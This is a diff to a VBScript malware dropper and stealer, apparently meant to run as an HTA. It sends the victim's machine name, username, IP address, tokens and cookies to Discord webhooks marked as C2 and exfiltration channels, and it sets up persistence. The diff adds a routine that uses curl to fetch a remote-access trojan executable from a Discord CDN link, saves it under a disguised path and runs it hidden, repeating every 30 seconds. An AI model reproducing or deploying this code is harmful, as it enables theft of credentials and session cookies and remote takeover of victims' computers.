@@ -12,20 +12,23 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' C2 WEBHOOK (Commands / Responses)
 WH = "https://discord.com/api/webhooks/1572026403560357978/n4qVnwrF6-OKw6vRfm73KZNXc-8X3IVSkOgQcfRb35d92LOEujl6OMvBy3GpPWrsXdQN"
-' EXFIL WEBHOOK (Logs / Drops)
+' EXFIL WEBHOOK (Logs / Drops / Re-grab)
 RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py18HaoCznPd3rfi411OUUewgpFL9Sfx7JGM7qYRtNtXU3vkHh5r"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- 1. INITIAL GRABS ---
+' --- 1. INITIAL GRABS (to C2 WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
 Call Persistence
 Call PostCookieOnly(WH)
 
-' --- 2. LOOP (30s grabs) ---
+' --- 2. DROP RAT LAST (init) ---
+Call DropRAT(WH, True)
+
+' --- 3. LOOP (30s, grabs + RAT re-drop to RE_WH) ---
 Dim runCount
 runCount = 0
 Do
@@ -34,10 +37,36 @@ Do
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
+    Call DropRAT(RE_WH, True)
     Call SleepSeconds(30)
 Loop
 
 window.close()
+
+' --- RAT DROP ---
+Sub DropRAT(targetWH, sendRocket)
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572752014616825856/client_9.exe?ex=6aff82f4&is=6afe3174&hm=841914e039c8b9df85e99842774e4bf44f6e6dc4c0bf290a1033dcbb02a00aed&"
+
+    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
+    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
+    Randomize
+    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
+    Dim op : op = tPath & "\" & fname
+
+    If sendRocket Then Call PostEmbedTo(":rocket: RAT Download Initiated", "Downloading and launching RAT", 10181046, targetWH)
+
+    If fso.FileExists(op) Then fso.DeleteFile op, True
+
+    Dim cCmd : cCmd = "cmd /c curl.exe -s -L --connect-timeout 5 --max-time 60 -o """ & op & """ """ & dl & """"
+    sh.Run cCmd, 0, True
+
+    If fso.FileExists(op) Then
+        If fso.GetFile(op).Size > 100000 Then
+            If sendRocket Then Call PostEmbedTo(":white_check_mark: RAT Launched", "RAT Launched", 10181046, targetWH)
+            Call RunCmd("""" & op & """")
+        End If
+    End If
+End Sub
 
 ' --- IP Function ---
 Sub IP(targetWH)
